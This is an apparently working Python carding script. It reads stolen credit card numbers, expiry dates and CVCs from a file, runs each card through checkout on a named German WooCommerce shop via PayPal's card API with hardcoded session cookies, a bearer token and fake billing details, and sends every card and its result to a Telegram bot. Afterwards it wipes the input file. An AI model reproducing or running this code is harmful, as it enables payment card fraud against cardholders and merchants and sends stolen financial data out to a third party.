import requests
import json
import os,re,time,random

file_path = 'cards.json'
bot_token = "5556552193:AAGGN0Mfi22qYaennhcLc-lMmqLrwOmi5LY"
chat_id = "1008961594"

def read_cards(file_path):
    with open(file_path, 'r') as file:
    	cards = [json.loads(line) for line in file]
    return cards
    
def process_cards(cards):
    
        for card in cards:
        	formatted_card = f"{card['num']}|{card['month']}|{card['year']}|{card['code']}"
        	nn, mm, yy, cvc = formatted_card.strip().split('|')
        	if len(yy) == 2 and yy.isdigit():
        		yy = "20" + yy
        	elif len(yy) == 4 and yy.isdigit():
       		 		pass
        	
        	cookies = {
    'real_cookie_banner-v:3_blog:1_path:eaca0d0-lang:ar': '1718370286%3A70a4721b-6913-4aed-95b7-8a1369b62c8e%3Afb8b4370a65c0bd6c85e68c38b697e15%3A%7B%2244%22%3A%5B604%2C603%2C602%2C598%5D%2C%2245%22%3A%5B601%5D%7D',
    'wp_woocommerce_session_89d20ffda4774feff3515cbb8c545d3b': 't_1da28faf123df5488bb338d3f0b044%7C%7C1718545263%7C%7C1718541663%7C%7Cd5a8757c2669b4b72950cb2dab7d1193',
    'woodmart_wishlist_count': '0',
    'wishlist_cleared_time': '1718372650',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '02e5304a052c64a7523bf1b33b8fc21d',

    }
    
        	headers = {
    'authority': 'joudi-line.de',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,hi-IN;q=0.6,hi;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://joudi-line.de',
    'referer': 'https://joudi-line.de/checkout/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        	}
        	params = {
    'wc-ajax': 'ppc-create-order',
    }
    
    
        	json_data = {
    'nonce': '2d0acfe84e',
    'payer': None,
    'bn_code': 'Woo_PPCP',
    'context': 'checkout',
    'order_id': '0',
    'payment_method': 'ppcp-credit-card-gateway',
    'form_encoded': 'billing_first_name=Ahmad&billing_last_name=Jousm&billing_country=US&billing_address_1=New+York&billing_city=New+York&billing_postcode=10009&billing_phone=%2B12029908659&billing_email=klbjzzel%40hi2.in&payment_method=ppcp-credit-card-gateway&woocommerce-process-checkout-nonce=42a16df8d9&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review',
    'createaccount': False,
    'save_payment_method': True,
    
    }
        	response = requests.post('https://joudi-line.de/', params=params, cookies=cookies, headers=headers, json=json_data)
        	
        #	print(response.json())
        	id = response.json()['data']['id']
        	custom_id = response.json()['data']['custom_id']
    ###
    
        	cookies = {
    'l7_az': 'dcg16.slc',
    'ts_c': 'vr%3D1b2213f51900a5521880d34cff53aa2e%26vt%3D1b2213f51900a5521880d34cff53aa2d',
    'enforce_policy': 'ccpa',
    'LANG': 'en_US%3BUS',
    'rssk': 'd%7DC9%407%3B9962%3E6%3BA7%3Exqx%3Eyyixg6%3A%3C%3F19',
    'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'FqqCxrwx0jNJ3AmJ_vuamgRDEokZL8o8Hu3A9eJUDO3Po2P6vTGQ0Ff8IrinmRw7x5MFeYhCv6GKgU-5',
    'sc_f': 'LoKS2TE5NvuTVLHoF56M3Vc4QzRdX7tLd1k6QyY_SHsY7i48j-0iSFUlrQ_ogsIXXcDkx1vcBuEAPCMIAUPVA0_7eNnlilCBlJ5h2m',
    'tsrce': 'loggernodeweb',
    'x-pp-s': 'eyJ0IjoiMTcxODQ0MjcwNDIzMiIsImwiOiIwIiwibSI6IjAifQ',
    'ts': 'vreXpYrS%3D1813050704%26vteXpYrS%3D1718444504%26vr%3D1b2213f51900a5521880d34cff53aa2e%26vt%3D1b2213f51900a5521880d34cff53aa2d%26vtyp%3Dnew',
}
   
        	headers = {
    'authority': 'www.paypal.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,hi-IN;q=0.6,hi;q=0.5',
    'authorization': 'Bearer A21AANKwj9zsLccHZ_jvucZoqQwS46CU3b9iCJA7VH1l8Kv_dAxaswOqhm6-Dg1HQV0v_sTdfsSDFBNLAy44lXeaRT9JXf5gw',
    'content-type': 'application/json',
    'origin': 'https://www.paypal.com',
    'paypal-client-metadata-id': 'uid_20a1359d52_mdy6mda6mzq',
    'paypal-partner-attribution-id': '',
    'prefer': 'return=representation',
    'referer': 'https://www.paypal.com/smart/card-field?style.input.appearance=none&style.input.color=rgb(119%2C%20119%2C%20119)&style.input.direction=rtl&style.input.font-family=Tajawal%2C%20Arial%2C%20Helvetica%2C%20sans-serif&style.input.font-size=14px&style.input.font-stretch=100%25&style.input.font-style=normal&style.input.font-variant=normal&style.input.font-variant-alternates=normal&style.input.font-variant-caps=normal&style.input.font-variant-east-asian=normal&style.input.font-variant-ligatures=normal&style.input.font-variant-numeric=normal&style.input.font-weight=400&style.input.letter-spacing=normal&style.input.line-height=22.4px&style.input.opacity=1&style.input.padding-bottom=0px&style.input.padding-left=15px&style.input.padding-right=15px&style.input.padding-top=0px&style.input.text-shadow=none&style.input.-webkit-tap-highlight-color=rgba(0%2C%200%2C%200%2C%200)&type=expiry&clientID=BAAJK3yaJelN7EXxZWh9TwNm8K6gKP-G51Sk6TKJUXicSXW6Nll1Q53J_zaQEmEZMhbGEgn0jzfqPNO9wg&sessionID=uid_20a1359d52_mdy6mda6mzq&clientMetadataID=uid_20a1359d52_mdy6mda6mzq&cardFieldsSessionID=uid_c6fb43685c_mdy6mdm6mju&env=production&debug=false&locale.country=US&locale.lang=en&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QkFBSkszeWFKZWxON0VYeFpXaDlUd05tOEs2Z0tQLUc1MVNrNlRLSlVYaWNTWFc2TmxsMVE1M0pfemFRRW1FWk1oYkdFZ24wanpmcVBOTzl3ZyZjdXJyZW5jeT1FVVImaW50ZWdyYXRpb24tZGF0ZT0yMDI0LTA0LTAzJmNvbXBvbmVudHM9YnV0dG9ucyxmdW5kaW5nLWVsaWdpYmlsaXR5LGNhcmQtZmllbGRzJnZhdWx0PWZhbHNlJmNvbW1pdD10cnVlJmludGVudD1jYXB0dXJlJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiV29vX1BQQ1AiLCJkYXRhLXVpZCI6InVpZF9xd2dpc3FybnNjeXNpcXlhcXFjeXljZnZqYnN1eHIifX0&disable-card=&currency=EUR&intent=capture&commit=true&vault=false&sdkCorrelationID=f7157221e977b',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    
    }
    
        	json_data = {
    'payment_source': {
        'card': {
            'number': f'{nn}',
            'security_code': f'{cvc}',
            'expiry': f'{yy}-{mm}',
            },
        },
    }
    
        	response = requests.post(
    f'https://www.paypal.com/v2/checkout/orders/{id}/confirm-payment-source',
    cookies=cookies,
    headers=headers,
    json=json_data,
    )
    
    #print(response.json())
    ###
    
        	cookies = {
    'real_cookie_banner-v:3_blog:1_path:eaca0d0-lang:ar': '1718370286%3A70a4721b-6913-4aed-95b7-8a1369b62c8e%3Afb8b4370a65c0bd6c85e68c38b697e15%3A%7B%2244%22%3A%5B604%2C603%2C602%2C598%5D%2C%2245%22%3A%5B601%5D%7D',
    'wp_woocommerce_session_89d20ffda4774feff3515cbb8c545d3b': 't_1da28faf123df5488bb338d3f0b044%7C%7C1718545263%7C%7C1718541663%7C%7Cd5a8757c2669b4b72950cb2dab7d1193',
    'woodmart_wishlist_count': '0',
    'wishlist_cleared_time': '1718372650',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '02e5304a052c64a7523bf1b33b8fc21d',
}
    

        	headers = {
    'authority': 'joudi-line.de',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,hi-IN;q=0.6,hi;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://joudi-line.de',
    'referer': 'https://joudi-line.de/checkout/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }
    
        	params = {
    'wc-ajax': 'checkout',
    }
    

        	data = {
    'billing_first_name': 'Ahmad',
    'billing_last_name': 'Jousm',
    'billing_country': 'US',
    'billing_address_1': 'New York',
    'billing_city': 'New York',
    'billing_postcode': '10009',
    'billing_phone': '+12029908659',
    'billing_email': 'klbjzzel@hi2.in',
    'payment_method': 'ppcp-credit-card-gateway',
    'woocommerce-process-checkout-nonce': 'f41b69fa34',
    '_wp_http_referer': '/?wc-ajax=update_order_review',
    'ppcp-resume-order': custom_id,
    }
    
        	response = requests.post('https://joudi-line.de/', params=params, cookies=cookies, headers=headers, data=data)
        	print(response.json())
        	html_message = response.json()["messages"]
        	cleanr = re.compile('<.*?>')
        	cleanmessage = re.sub(cleanr, '', html_message)
        	result = cleanmessage.strip()
    
    ### Send To Telegram bot 
        	requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",params={"chat_id": chat_id,"text": f"{formatted_card.strip()} ----> {response.json()}"})
    ###
 
        
                      
        
        
if __name__ == "__main__":    
    cards = read_cards(file_path)
    process_cards(cards)
    with open(file_path, 'w') as file:
    	file.write('')
